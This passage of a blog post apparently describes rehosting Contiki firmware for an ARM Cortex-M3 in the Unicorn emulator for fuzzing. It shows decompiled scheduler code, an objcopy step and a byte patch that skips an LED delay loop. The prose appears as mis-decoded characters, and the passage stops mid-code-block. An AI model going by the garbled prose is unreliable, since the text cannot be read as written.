    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>å¯åŠ¨å®Œè¿™ä¸¤ä¸ª process ä¹‹åï¼Œä¸€ä¸ª While å¾ªç¯é‡Œå¼€å§‹ <code>process_run</code>ã€‚æ³¨æ„ start å’Œ run çš„åŒºåˆ«ï¼Œstart å¯ä»¥è®¤ä¸ºåªæ˜¯æŠŠ process ç»“æ„ã€èµ„æºå‡†å¤‡å¥½ï¼Œè€Œ run æ‰æ˜¯çœŸæ­£åœ°è¿è¡Œï¼ˆç®€å•æ¥è¯´å°±æ˜¯ä¿®æ”¹ process çŠ¶æ€ï¼Œè®©å®ƒè·‘èµ·æ¥ï¼‰ï¼Œæ‰€ä»¥æ—¢ç„¶å®ƒæ˜¯ä¸€ä¸ªæ“ä½œç³»ç»Ÿï¼Œé‚£ä¹ˆè¿™ä¸ª <code>process_run</code> é‡Œç†åº”å‡ºç°å®ƒçš„è°ƒåº¦ç®—æ³•ã€‚æœç„¶ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">process_run</span><span class="p">()</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">poll_requested</span> <span class="p">)</span>
    <span class="n">do_poll</span><span class="p">();</span>
  <span class="n">do_event</span><span class="p">();</span>
  <span class="k">return</span> <span class="n">poll_requested</span> <span class="o">+</span> <span class="n">nevents</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>do_poll</code> é‡Œå»éå† <code>process_list</code>ï¼Œæ ¹æ®å‰é¢çš„çŒœæµ‹é‚£ä¹ˆè¿™ä¸ª process_list ç†åº”æ˜¯åœ¨å‰é¢å¯åŠ¨çš„è¿‡ç¨‹ä¸­æ„å»ºçš„ã€‚æ‰€ä»¥å°±æ˜¯ä¸åœåœ°éå†æ‰€æœ‰ processï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å“ªä¸ªéœ€è¦å¯åŠ¨äº†ã€‚å¦‚æœæœ‰ï¼Œé‚£å°± <code>call_process</code>ã€‚<code>do_event</code> é‡Œä¹Ÿæ˜¯ç±»ä¼¼ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">do_poll</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">process</span> <span class="o">*</span><span class="n">i</span><span class="p">;</span> <span class="c1">// r4
</span><span class="c1"></span>
  <span class="n">poll_requested</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">process_list</span><span class="p">;</span> <span class="n">i</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span><span class="o">-&gt;</span><span class="n">next</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span><span class="o">-&gt;</span><span class="n">needspoll</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">i</span><span class="o">-&gt;</span><span class="n">state</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
      <span class="n">i</span><span class="o">-&gt;</span><span class="n">needspoll</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">call_process</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x82u</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>æ€»ä¹‹æ˜¯èµ°åˆ°äº† <code>call_process</code>ï¼Œè¿™é‡Œé¢ä¸€ä¸ªå¤§å¤§åœ°å‡½æ•°æŒ‡é’ˆè¿è¡Œæ ‡å¿—ç€æˆ‘ä»¬åˆ†æçš„ç»“æŸã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">call_process</span><span class="p">(</span><span class="n">process</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="n">process_event_t</span> <span class="n">ev</span><span class="p">,</span> <span class="n">process_data_t</span> <span class="n">data</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// r5
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="p">(</span><span class="o">*</span><span class="kr">thread</span><span class="p">)(</span><span class="n">pt</span> <span class="o">*</span><span class="p">,</span> <span class="n">process_event_t</span><span class="p">,</span> <span class="n">process_data_t</span><span class="p">);</span> <span class="c1">// r3
</span><span class="c1"></span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">state</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="n">ev</span><span class="p">;</span>
    <span class="kr">thread</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="kr">thread</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="kr">thread</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">process_current</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
      <span class="n">p</span><span class="o">-&gt;</span><span class="n">state</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(((</span><span class="kt">int</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="n">pt</span> <span class="o">*</span><span class="p">,</span> <span class="n">process_event_t</span><span class="p">,</span> <span class="n">process_data_t</span><span class="p">))</span><span class="kr">thread</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">pt</span><span class="p">,</span> <span class="n">ev</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">1</span>
        <span class="o">||</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">131</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">exit_process</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">else</span>
      <span class="p">{</span>
        <span class="n">p</span><span class="o">-&gt;</span><span class="n">state</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å‘ç°è¿™ä¸ª firmware çœ‹ä¸Šå»å°±æ˜¯ä¸åœåœ°æ‰§è¡Œä¸¤ä¸ªå‡½æ•°ã€‚å½“ç„¶å¦‚æœæŸ¥çœ‹æ‰€æœ‰è°ƒç”¨äº† <code>process_start</code> çš„åœ°æ–¹å¯ä»¥å‘ç°è¿˜ä¼šè¿è¡Œå…¶ä»–å‡½æ•°ã€‚</p>
<h4 id="ä¸€äº›é¢˜å¤–è¯">ä¸€äº›é¢˜å¤–è¯ï¼Ÿ</h4>
<h6 id="dma">DMA</h6>
<p>DMA æ˜¯ç¡¬ä»¶ï¼Œä¼šç»´æŠ¤ä¸€ä¸ª dma bufferï¼Œæ˜¯å¤–è®¾åˆ°å†…å­˜çš„é«˜é€Ÿé€šé“ã€‚ä¸€èˆ¬ firmware ç¨‹åºè¦ä½¿ç”¨å¤–è®¾æ•°æ®ï¼Œæ˜¯ä» MMIO é‡Œæ‹¿æ¥ç”¨ã€‚æœ‰äº† DMA ä»¥åä¸ç»è¿‡ MMIOï¼ŒDMA ç›´æ¥æ”¹å˜ç‰©ç†å†…å­˜ï¼Œå°†å¤–è®¾çš„æ•°æ®å†™è¿›å†…å­˜ï¼Œå­˜åœ¨ dma buffer ä¸­ï¼Œè€Œ firmware ç¨‹åºåªéœ€è¦ä»è¿™ä¸ª buffer ä¸­æ‹¿å°±è¡Œäº†ã€‚è¿™å…¶ä¸­çœç•¥äº† CPU çš„å„ç§æ˜ å°„ã€è¯»å†™è¿‡ç¨‹ã€‚</p>
<h6 id="ä¸­æ–­">ä¸­æ–­</h6>
<p>ä¸­æ–­å¯¹äºç³»ç»Ÿæ¥è¯´æ˜¯éå¸¸é‡è¦çš„ï¼Œä¸€ä¸ªæ”¯æŒä¸­æ–­çš„ CPU ä¼šåœ¨æ¯æ¡æ‰§è¡Œç»“æŸä¹‹åï¼Œå»çœ‹çœ‹ä¸­æ–­ç¡¬ä»¶æ˜¯å¦äº§ç”Ÿä¸­æ–­ï¼Œå¦‚æœäº§ç”Ÿäº†å°±å»ä¸­æ–­å‘é‡è¡¨é‡Œæ‰¾å¯¹åº”ä¸­æ–­å‡½æ•°åœ°å€ã€‚åœ¨æ‰§è¡Œä¸­æ–­å‡½æ•°ä¹‹å‰ï¼Œç”±<strong>ç¡¬ä»¶</strong>ä¿å­˜ä¸Šä¸‹æ–‡ï¼ˆå¯„å­˜å™¨ç­‰ï¼‰ã€‚æ‰§è¡Œå®Œä¸­æ–­å‡½æ•°ä¹‹åï¼Œç”±<strong>ç¡¬ä»¶</strong>æ¢å¤ä¸Šä¸‹æ–‡ï¼Œç»§ç»­æ‰§è¡Œã€‚</p>
<p>è€ƒè™‘è¿™æ ·ä¸€ä¸ªéœ€æ±‚ï¼Œä¸€ä¸ª firmware æƒ³è¦å¤„ç†æ¥æ”¶åˆ°çš„ç½‘ç»œåŒ…ã€‚èƒ½æƒ³åˆ°çš„åšæ³•æ˜¯ï¼šfirmware æŠŠç½‘ç»œåŒ…çš„å¤„ç†å‡½æ•°æ”¾åœ¨ç½‘å¡çš„ä¸­æ–­å‡½æ•°ä¸­ã€‚æ¯å½“ç½‘å¡æ¥æ”¶åˆ°ç½‘ç»œåŒ…æ—¶ï¼Œå®ƒäº§ç”Ÿä¸­æ–­ï¼Œå¹¶é€šè¿‡ DMA æˆ–è€… MMIO æ–¹å¼å°†ç½‘ç»œåŒ…å†…å®¹å‘é€ç»™ç¨‹åºï¼ŒCPU æ•è·ä¸­æ–­è·‘å»æ‰§è¡Œä¸­æ–­å‡½æ•°ï¼Œå¤„ç†ç½‘ç»œåŒ…ï¼Œå®ç°éœ€æ±‚ã€‚è¿™ç§å“åº”å¼çš„å¤„ç†æ–¹æ³•æ— ç–‘æ˜¯ä¸­æ–­æœºåˆ¶ä¸‹çš„äº§ç‰©ï¼Œå‡å°‘ CPU ç©ºè½¬ã€‚</p>
<p>è¿™æ ·å¾ˆè‡ªç„¶ä¼šæƒ³åˆ°è¿™ä¸ªé—®é¢˜ï¼Œè¿™ä¸ª Contiki çš„ <code>process_thread_tcpip_process</code> ä»»åŠ¡ï¼Œçœ‹ä¸Šå»å°±æ˜¯å»å“åº”ã€å¤„ç†ç½‘ç»œåŒ…ã€‚ä¸ºå•¥å®ƒè¢«æ”¾åœ¨ main å‡½æ•°é‡Œä¸€éåˆä¸€éæ‰§è¡Œå‘¢ï¼Ÿè¿™å°†éšç€æœ¬æ–‡ä¸æ–­æ·±å…¥åœ°åˆ†æä»£ç è€Œæ­å¼€è°œåº•ã€‚</p>
<h2 id="re-host">Re-host</h2>
<p>ç†è§£å¤Ÿäº†æ¥ä¸‹æ¥æ‰çœŸæ­£å¼€å§‹å¹²æ´»å„¿ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥çš„å·¥ä½œé‡å¿ƒæ˜¯ç”¨ Unicorn æŠŠè¿™ä¸ª firmware è·‘èµ·æ¥ã€‚</p>
<h4 id="å‡†å¤‡å·¥ä½œ">å‡†å¤‡å·¥ä½œ</h4>
<h6 id="extract-raw-binary">extract raw binary</h6>
<p>ä¼—æ‰€å‘¨çŸ¥ï¼Œä¸€ä¸ª ELF å¹¶ä¸æ˜¯ä»»ä½•æ®µéƒ½æ˜¯æœ‰ç”¨çš„ã€‚ç‰¹åˆ«æ˜¯åœ¨åµŒå…¥å¼çš„åœºæ™¯ä¸‹ï¼Œå­˜å‚¨ç©ºé—´å¯¸åœŸå¯¸é‡‘ï¼ŒæŠŠæ•´ä¸ª ELF å…¨éƒ¨çƒ§è¿›æ¿å­å±å®æµªè´¹ã€‚åœ¨è¿™ä¸ªåœºæ™¯ä¸‹ï¼Œæ„Ÿè§‰æŠŠ .text å’Œ .data æå‡ºæ¥å°±è¶³å¤Ÿ Unicorn å»æ¨¡æ‹Ÿäº†ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">x1do0@ubt2022:~/firmware_fuzz/labs/day6$ arm-none-eabi-objcopy -O binary ./hello-world.elf hello-world.bin
x1do0@ubt2022:~/firmware_fuzz/labs/day6$ ls -la
total 812
drwxrwxr-x 2 x1do0 x1do0   4096 Sep 28 11:29 .
drwxrwxr-x 5 x1do0 x1do0   4096 Sep 26 18:47 ..
-rwxrwxr-x 1 x1do0 x1do0 516096 Sep 28 11:29 hello-world.bin
-rwxrwxr-x 1 x1do0 x1do0 730104 Sep 28 11:26 hello-world.elf
</code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥ xxd å¯¹æ¯”çœ‹çœ‹æå–å‡ºæ¥çš„ binary é•¿ä»€ä¹ˆæ ·ï¼šå¼€å¤´å°±æ˜¯ <code>.text</code> æ®µï¼Œè€Œ <code>.data</code> æ®µè¢«æ”¾åœ¨äº† 0x00012920 å¤„ã€‚è¿™é‡Œå¾ˆè‡ªç„¶ä¼šæƒ³åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œè¿™ä¸¤ä¸ªæ®µçš„ç›¸å¯¹ä½ç½®ç›¸å¯¹äº ELF æ¥è¯´æ˜¾ç„¶å‘ç”Ÿäº†æ”¹å˜ã€‚é‚£ä¹ˆä»£ç ä¸­è®¿é—® <code>.data</code> æ—¶å¯»å€å²‚ä¸æ˜¯å¤±æ•ˆäº†ï¼Ÿå‰é¢æåˆ° <code>.data</code> æ˜¯åœ¨ reset_handler ä¸­æ‹·è´çš„ï¼Œè€Œè¿™é‡Œä¸€ä¸ªç¥å¥‡çš„åœ°æ–¹å°±åœ¨äºï¼Œæ‹·è´çš„åœ°å€ <code>0x214920</code> ä¸ <code>.text</code> æ®µï¼ˆ0x202000å¼€å§‹ï¼‰ä¹‹é—´æ­£å¥½å·®äº† 0x00012920ï¼Œä½¿å¾—åœ¨æ¨¡æ‹Ÿä¸­åªè¦æ­£ç¡®å®šä½äº†ä»£ç æ®µï¼Œé‚£ä¹ˆå°±ä¸ä¼šå‡ºç°ä»»ä½•é—®é¢˜ã€‚è¿™åˆ°åº•æ˜¯å·§åˆè¿˜æ˜¯å¿…ç„¶ï¼Ÿ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ble_l2cap_tx_process</span><span class="p">,</span> <span class="mh">0x214920</span><span class="p">,</span> <span class="mh">0x362u</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h6 id="arm-cortex-m3-memory-layout">ARM Cortex-M3 memory layout</h6>
<p>æ¸…æ¸…æ¥šæ¥šï¼Œæ˜æ˜ç™½ç™½ï¼š<a href="https://documentation-service.arm.com/static/5ea823e69931941038df1b11?token=" target="_blank" rel="noopener noreffer">memory map</a></p>
<p>å…¶ä¸­ Peripheral åŒºåŸŸå°±æ˜¯ MMIOï¼Œä¸€èˆ¬æ¥è¯´æˆ‘ä»¬åªéœ€è¦åœ¨ Unicorn ä¸­ map 0 - 0x60000000 å’Œ 0xE0000000 ä»¥ä¸Šçš„åŒºåŸŸã€‚</p>
<h6 id="å¦‚ä½•æ¨¡æ‹Ÿä¸­æ–­">å¦‚ä½•æ¨¡æ‹Ÿä¸­æ–­</h6>
<p>Unicorn æ˜¯åŸºäº QEMU å¼€å‘çš„ï¼Œä½†å‰è€…å°† QEMU çš„ä¸­æ–­æ”¯æŒå®Œå…¨å»æ‰äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨è½¯ä»¶æ¥æ¨¡æ‹Ÿä¸­æ–­å“åº”çš„è¿‡ç¨‹ã€‚ç®€å•æ¥æƒ³ï¼Œå½“ä»£ç æ¨¡æ‹Ÿæ‰§è¡Œåˆ°è¦å‘ç”Ÿä¸­æ–­çš„ä½ç½®å¤„æ—¶ï¼Œä¿å­˜å¯„å­˜å™¨ï¼Œè·³åˆ°å¯¹åº”ä¸­æ–­å‡½æ•°ï¼Œæ‰§è¡Œå®Œæ¢å¤å¯„å­˜å™¨ï¼Œè·³å›ä¸­æ–­å‘ç”Ÿå¤„æ¥ç€æ‰§è¡Œå³å¯ã€‚</p>
<p>Unicorn æ¨¡æ‹Ÿä¸­æ–­çš„è¿‡ç¨‹ç–‘ä¼¼æ˜¯å¤§æœ‰é—¨é“ï¼Œä½†æš‚ä¸”å…ˆæŠ±ç€èƒ½ç”¨å°±è¡Œçš„å¿ƒæ€ç»§ç»­ä¸‹å»ï¼Œä¸æ·±å…¥ç ”ç©¶äº†ã€‚</p>
<h6 id="å¦‚ä½•æ¨¡æ‹Ÿç¡¬ä»¶">å¦‚ä½•æ¨¡æ‹Ÿç¡¬ä»¶</h6>
<p>ä¸€ä¸ªå›ºä»¶ä¸Šçš„ç¡¬ä»¶ï¼Œæ¯”å¦‚ä¼ æ„Ÿå™¨ï¼Œæ”¶åˆ°äº†æ•°æ®ï¼Œå®ƒè¦ä» MMIO å¯„å­˜å™¨é‡Œè¯»ã€‚å¦‚ä½•æ¨¡æ‹Ÿ MMIO å¯„å­˜å™¨è¯»å‘¢ï¼Ÿæˆ‘ä»¬ä¹Ÿç®€å•åœ°æƒ³ï¼Œæ¯å½“è¯»æŸäº›åœ°å€æ—¶ï¼Œä¸»åŠ¨ mem_write ä¸€ä¸ªéšæœºå€¼ï¼Œæ¨¡æ‹Ÿç¡¬ä»¶æ•°æ®å°±å¥½äº†å§ï¼Ÿ</p>
<h6 id="å¦‚ä½•è·³è¿‡æŸäº›å‡½æ•°">å¦‚ä½•è·³è¿‡æŸäº›å‡½æ•°ï¼Ÿ</h6>
<p>åœ¨ hook code çš„æ—¶å€™å‘ç°ï¼Œæœ‰äº›å‡½æ•°å¼‚å¸¸çƒ¦äººï¼Œæ¯”å¦‚ <code>fade</code> å‡½æ•°ä¸­çš„å¾ªç¯åœ¨è¢« hook ä¸Šä¹‹åä½¿å¾—æ•´ä¸ªæ¨¡æ‹Ÿè¿‡ç¨‹å˜å¾—ç©¶ææ…¢ï¼Œè€Œæ˜¾ç„¶è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªæœ‰ä»€ä¹ˆä½œç”¨çš„å‡½æ•°ï¼Œæ‰€ä»¥å¾—æƒ³ä¸ªåŠæ³•åœ¨æ¨¡æ‹Ÿçš„æ—¶å€™ç›´æ¥å°†å…¶è·³è¿‡ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">fade</span><span class="p">(</span><span class="n">leds_mask_t</span> <span class="n">l</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// r5
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// r4
</span><span class="c1"></span>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+4h] [bp-14h]
</span><span class="c1"></span>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">ia</span><span class="p">;</span> <span class="c1">// [sp+4h] [bp-14h]
</span><span class="c1"></span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">800</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">j</span> <span class="o">&gt;</span> <span class="mi">400</span> <span class="p">)</span>
      <span class="n">v3</span> <span class="o">=</span> <span class="mi">800</span> <span class="o">-</span> <span class="n">j</span><span class="p">;</span>
    <span class="k">else</span>
      <span class="n">v3</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
    <span class="n">leds_on</span><span class="p">(</span><span class="n">l</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">v3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
      <span class="p">;</span>
    <span class="n">leds_off</span><span class="p">(</span><span class="n">l</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">ia</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="mi">400</span> <span class="o">-</span> <span class="n">v3</span> <span class="o">&gt;</span> <span class="n">ia</span><span class="p">;</span> <span class="o">++</span><span class="n">ia</span> <span class="p">)</span>
      <span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>å…¶å®æ€è·¯ä¹Ÿéå¸¸ç®€å•ï¼Œåœ¨å¼€å§‹æ¨¡æ‹Ÿä¹‹å‰æŠŠå®ƒ patch æ‰è®©å®ƒæå‰è¿”å›å°±è¡Œäº†ã€‚è§‚å¯Ÿå‡½æ•°ä½“ï¼Œè¿›å»çš„æ—¶å€™å¯„å­˜å™¨å…¥æ ˆï¼Œä¸‹æ‹‰ SPï¼Œå‡ºæ¥çš„æ—¶å€™ä¸Šæ‹‰ SP å¹¶å¤åŸå¯„å­˜å™¨ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">.text:00210924 ; void __fastcall fade(leds_mask_t l)
.text:00210924 fade                                    ; CODE XREF: platform_init_stage_two+3Câ†‘p
.text:00210924                                         ; platform_init_stage_three+20â†‘p ...
.text:00210924
.text:00210924 i               = -0x14
.text:00210924
.text:00210924 l = R0                                  ; leds_mask_t
.text:00210924                 PUSH    {R4-R6,LR}
.text:00210926                 SUB     SP, SP, #8

...

.text:0021097C                 ADD     SP, SP, #8
.text:0021097E                 POP     {R4-R6,PC}
</code></pre></td></tr></table>
</div>
</div><p>é‚£ä¹ˆå¾ˆè‡ªç„¶çš„ï¼Œæˆ‘ä»¬æŠŠ 0x210926 å¤„çš„ä»£ç ç›´æ¥ä¿®æ”¹ä¸º <code>POP {R4-R6,PC}</code> å³å¯ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="mh">0x210926</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x70\xBD</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># bypass fade, POP {R4-R6,PC}</span>
</code></pre></td></tr></table>
</div>
</div><p>è§£å†³ä¸äº†é—®é¢˜ï¼Œå°±æ¶ˆç­æå‡ºé—®é¢˜çš„äººï¼</p>
<h4 id="æ¨¡æ‹Ÿç¨‹åºå¹¶äº§ç”Ÿä¸€ä¸ª-reset-ä¸­æ–­">æ¨¡æ‹Ÿç¨‹åºï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª reset ä¸­æ–­</h4>
<p>æˆ‘ä»¬å…ˆæ¨¡æ‹Ÿæ‰§è¡Œåˆ° 0x210768 å¤„ã€‚æ€è·¯å·²ç»ååˆ†æ¸…æ™°äº†ï¼Œç›´æ¥ä¸Šç ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
